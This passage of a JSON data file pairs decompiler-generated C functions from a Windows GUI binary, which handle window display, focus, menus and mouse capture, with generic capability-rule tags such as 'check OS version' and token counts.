        "decompiled_code": "\nvoid __fastcall fcn.00458550(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x22e) = param_2;\n    if (*(in_EAX + 0x27c) != 0) {\n        fcn.0043e9fc(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x220) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.004444a4(0, 1);\n            fcn.00458140();\n        }\n        fcn.00458604();\n        fcn.00458500();\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "004585b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004585b4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x22e) != '\\0') && (*(in_EAX + 0x220) != 0)) {\n        fcn.0043e9fc(param_2);\n    }\n    if (*(in_EAX + 0x22f) == '\\x02') {\n        iVar1 = fcn.004571c4();\n        if (iVar1 != 0) {\n            fcn.004571c4();\n            fcn.004585b4();\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00458604": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458604(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x2f4) & 8) == 0) && (*(*0x485b48 + 0x44) != 0)) && (*(*(*0x485b48 + 0x44) + 0x248) != 0)) &&\n       ((in_EAX != *(*0x485b48 + 0x44) && ((*(in_EAX + 0x22f) == '\\x01' || (*(*(*0x485b48 + 0x44) + 0x22f) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.00451544();\n        }\n        else {\n            fcn.00451528();\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "00458794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458794(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4587ad;\n    fcn.00426d58();\n    uStack24 = 0x458842;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x4587cb;\n    puStack20 = &stack0xfffffffc;\n    fcn.004270cc();\n    uStack36 = 0x45881f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 0x250) == 0) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00403a28();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        (**(**(in_EAX + 0x250) + 0x28))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x458826;\n    uStack36 = 0x45881e;\n    fcn.004270cc();\n    return;\n}\n",
        "token_count": 313
    },
    "00458b4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458b4c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x9b) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        uVar1 = fcn.0044407c();\n        iVar2 = sub.user32.dll_IsIconic(uVar1);\n        if (iVar2 == 0) {\n            uVar1 = fcn.0044407c(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar1);\n            uVar1 = fcn.0044407c(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar1);\n            if (*(in_EAX + 0x22e) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.0043dee4();\n            return;\n        }\n    }\n    fcn.0043ef20();\n    return;\n}\n",
        "token_count": 291
    },
    "00458cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458cc0(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x458d5b;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x248) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.004508a8();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.0045dc20();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0043a990();\n            fcn.0045dc20();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x458d62;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 444
    },
    "00459050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00459050(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x150) == '\\x01') && (*(in_EAX + 0x158) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x150) == '\\0') && (*(in_EAX + 0x154) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "00459088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459088(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x150) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x158);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "004590bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004590bc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_10h = 0;\n    uStack56 = 0x45920d;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack52 = &stack0xfffffffc;\n            for (iVar2 = fcn.0043a70c(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.00459050();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x004591f7;\n            fcn.00459088(&fcn.004590bc::var_10h);\n            fcn.0041b058();\n            fcn.0043d360();\n            fcn.0040760c();\n        }\n        else {\n            var_9h._0_1_ = '\\x01';\n            *NULL = fcn.00459010(&stack0xfffffffc);\n            if (*NULL == 0) {\n                *NULL = fcn.00459010(&stack0xfffffffc);\n            }\n            fcn.0041b058();\n            fcn.0043d360();\n            fcn.0040760c();\n        }\n        if (((*(in_EAX + 0x228) & 8) == 0) || (var_9h != '\\x01')) {\n            if (var_9h == '\\x01') {\n                fcn.0045d8a4();\n            }\n            else if (var_9h == '\\0') {\n                fcn.0045d814();\n            }\n        }\n        else {\n            fcn.0045d92c();\n            fcn.0045d92c();\n        }\n    }\ncode_r0x004591f7:\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x459214;\n    uStack56 = 0x45920c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 632
    },
    "004592bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004592bc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x2e2) != '\\0') && ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) {\n        fcn.004572c4();\n        fcn.0045aa90();\n        fcn.004572c4();\n        fcn.0045aa90();\n        fcn.00459290(arg_8h);\n        fcn.004572c4();\n        fcn.0045aa90();\n        fcn.00459290(arg_8h_00);\n        fcn.00459290(&stack0xfffffffc);\n        fcn.00459290(&stack0xfffffffc);\n    }\n    fcn.004425e0();\n    return;\n}\n",
        "token_count": 300
    },
    "00459458": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459458(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x4599c2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xbd) & 4) != 0)) {\n        puStack40 = 0x459499;\n        fcn.0040675c();\n        puStack40 = 0x4594a8;\n        fcn.0040c8dc();\n        puStack40 = 0x4594ad;\n        fcn.00403fc0();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x4594b7;\n    fcn.0045dd10();\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) | 4;\n    uStack44 = 0x4599a5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1a6) == '\\0') {\n            iStack56 = 0x4598ac;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.00403a28();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x485b4c + 0x6c) == in_EAX) {\n                puStack52 = 0x4598da;\n                fcn.00458604();\n            }\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                puStack52 = 0x4598ee;\n                fcn.0044159c();\n            }\n            else if ((*(in_EAX + 0xbd) & 8) == 0) {\n                iVar6 = 0;\n                puStack52 = 0x459928;\n                iVar4 = fcn.0044407c();\n                puStack52 = 0x45992f;\n                iVar5 = sub.user32.dll_GetActiveWindow();\n                if (iVar4 == iVar5) {\n                    puStack52 = 0x45993b;\n                    puStack52 = fcn.0044407c();\n                    iStack56 = 0x459941;\n                    iVar4 = sub.user32.dll_IsIconic();\n                    if (iVar4 == 0) {\n                        iStack56 = 0x45994d;\n                        fcn.0044407c();\n                        iStack56 = 0x459952;\n                        iVar6 = fcn.00454248();\n                    }\n                }\n                if (iVar6 == 0) {\n                    iStack56 = 0;\n                    uStack60 = 0x459987;\n                    uStack60 = fcn.0044407c();\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iStack56 = 0x97;\n                    uStack60 = 0;\n                    uVar3 = fcn.0044407c(0, 0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar3);\n                    sub.user32.dll_SetActiveWindow(iVar6);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar3 = fcn.0044407c(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar3);\n            }\n        }\n        else {\n            iStack56 = 0x459510;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.00403a28();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x8c) == '\\x04') || ((*(in_EAX + 0x8c) == '\\x06' && (*(in_EAX + 0x22f) == '\\x01')))) {\n                if (*(in_EAX + 0x22f) == '\\x01') {\n                    puStack52 = 0x45956c;\n                    fcn.0043d24c();\n                    puStack52 = 0x459588;\n                    fcn.0043d290();\n                }\n                else {\n                    puStack52 = 0x4595a1;\n                    fcn.0045acec();\n                    puStack52 = 0x4595ba;\n                    fcn.0045ace0();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4595f0;\n                (**(*in_EAX + 0x84))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    iStack56 = 0x459605;\n                    fcn.004578ac();\n                }\n            }\n            else if (*(in_EAX + 0x8c) - 6U < 2) {\n                iVar4 = *(*0x485b48 + 0x44);\n                if (*(in_EAX + 0x8c) == '\\a') {\n                    puStack52 = 0x459646;\n                    cVar2 = fcn.004039b8();\n                    if (cVar2 != '\\0') {\n                        iVar4 = in_EAX[1];\n                    }\n                }\n                if (iVar4 == 0) {\n                    puStack52 = 0x459686;\n                    fcn.0045acec();\n                    puStack52 = 0x45969f;\n                    fcn.0045ace0();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4596d5;\n                (**(*in_EAX + 0x84))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    iStack56 = 0x4596ea;\n                    fcn.004578ac();\n                }\n            }\n            else if (*(in_EAX + 0x8c) == '\\x05') {\n                if (*(in_EAX + 0x22f) == '\\x01') {\n                    puStack52 = 0x459710;\n                    fcn.0043d24c();\n                    puStack52 = 0x45972c;\n                    fcn.0043d290();\n                }\n                else {\n                    puStack52 = 0x459745;\n                    fcn.0045ad1c();\n                    puStack52 = 0x45975e;\n                    fcn.0045ad10();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x459794;\n                (**(*in_EAX + 0x84))();\n            }\n            *(in_EAX + 0x8c) = 0;\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                if (*(in_EAX + 0x22b) == '\\x02') {\n                    iStack56 = 0;\n                    uStack60 = 0x4597c4;\n                    uStack60 = fcn.0044407c();\n                    sub.user32.dll_SendMessageA(*(*(*0x485b48 + 0x44) + 0x254), 0x223);\n                    uVar3 = fcn.0044407c(3);\n                    sub.user32.dll_ShowWindow(uVar3);\n                }\n                else {\n                    iStack56 = *(*(in_EAX + 0x22b) * 4 + 0x483e84);\n                    uStack60 = 0x45980a;\n                    uStack60 = fcn.0044407c();\n                    sub.user32.dll_ShowWindow();\n                    uVar3 = fcn.0044407c(5, 0, in_EAX[0x12] | in_EAX[0x13] << 0x10);\n                    sub.user32.dll_CallWindowProcA(0x40710c, uVar3);\n                    fcn.0043daa8();\n                }\n                uStack60 = *(*(*0x485b48 + 0x44) + 0x254);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                iStack56 = *(*(in_EAX + 0x22b) * 4 + 0x483e84);\n                uStack60 = 0x45987d;\n                uStack60 = fcn.0044407c();\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) & 0xfb;\n    return;\n}\n",
        "token_count": 2203
    },
    "00459a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459a50(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x459a7c;\n            fcn.00425f64();\n            uStack20 = 0x459aae;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x459ab5;\n            uStack20 = 0x459aad;\n            fcn.00403820();\n            return;\n        }\n        puStack16 = 0x459a6e;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00459ae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459ae8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xbd) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xe4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x22f) == '\\x01') {\n                if ((*(in_EAX + 0x8a) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.00403a28();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x485b48 + 0x44)) {\n                    fcn.0045d360();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00459c88();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0045786c();\n                }\n                else {\n                    fcn.00459d24();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0x93] = 2;\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "00459ca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459ca8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x459d16;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x22e) != '\\0') goto code_r0x00459d00;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x00459cd8:\n        puStack16 = puVar1;\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x00459cd8;\n    }\n    fcn.00458500();\ncode_r0x00459d00:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x459d1d;\n    uStack20 = 0x459d15;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 333
    },
    "00459d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459d40(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x45a008;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x459d63;\n    fcn.0043c0a8();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x459d74;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xbd) & 8) == 0)) && (*(in_EAX + 0x22f) != '\\x01')) goto code_r0x00459db1;\n    }\n    puStack60 = 0x459d9d;\n    fcn.0040675c();\n    puStack60 = 0x459dac;\n    fcn.0040c8dc();\n    puStack60 = 0x459db1;\n    fcn.00403fc0();\ncode_r0x00459db1:\n    puStack60 = 0x459db6;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x459dc5;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x459dcb;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x459dd0;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x459dda;\n    fcn.0045c220();\n    uStack64 = 0x459feb;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xbd) = *(in_EAX + 0xbd) | 8;\n    puStack72 = 0x459df7;\n    puStack60 = &stack0xfffffffc;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x459e19;\n    fcn.0041c54c();\n    *(*0x485b4c + 0x78) = in_EAX;\n    puStack72 = 0x459e3d;\n    fcn.0045b23c();\n    puStack72 = 0x459e4f;\n    fcn.004540e0();\n    uStack76 = 0x459fc9;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x459e68;\n    puStack72 = &stack0xfffffffc;\n    fcn.00459c90();\n    uStack88 = 0x459f28;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.0044407c(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0x93] = 0;\n    do {\n        fcn.0045d0d0();\n        if (*(*0x485b48 + 0x9c) == '\\0') {\n            if (in_EAX[0x93] != 0) {\n                fcn.00459bf0();\n            }\n        }\n        else {\n            in_EAX[0x93] = 2;\n        }\n    } while (in_EAX[0x93] == 0);\n    uVar3 = fcn.0044407c(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.0044407c();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.00459c88(0x459f2f);\n    return;\n}\n",
        "token_count": 1077
    },
    "0045a018": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a018(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.00440d74(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00440d38();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x78))();\n            }\n            cVar1 = fcn.004039b8();\n            if (cVar1 != '\\0') {\n                fcn.0045a018(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0045a088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a088(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        (**(*in_EAX + 0x78))();\n        if ((in_EAX[0x92] != 0) && (iVar1 = fcn.0044f454(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.0044f464();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.0045a018(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "0045a160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a160(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.00440d74(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00440d38();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.0045a130(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004039b8(),  cVar1 != '\\0' && (cVar1 = fcn.0045a160(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "0045a1dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
